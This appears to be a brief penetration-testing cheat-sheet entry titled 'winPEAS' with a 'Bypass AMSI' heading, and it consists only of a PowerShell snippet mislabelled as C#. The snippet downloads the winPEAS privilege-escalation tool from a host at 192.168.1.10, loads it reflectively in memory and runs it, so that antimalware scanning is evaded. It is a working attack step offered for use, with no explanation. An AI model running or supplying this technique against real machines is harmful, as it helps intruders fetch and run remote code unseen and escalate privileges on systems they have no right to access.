# winPEAS





## Bypass AMSI

```csharp
$ass = (new-object net.webclient).DownloadData('http://192.168.1.10/tools/winPEASx64.exe')
$assem = [System.Reflection.Assembly]::Load($ass)
[WinPEAS.Program]::main("")
```

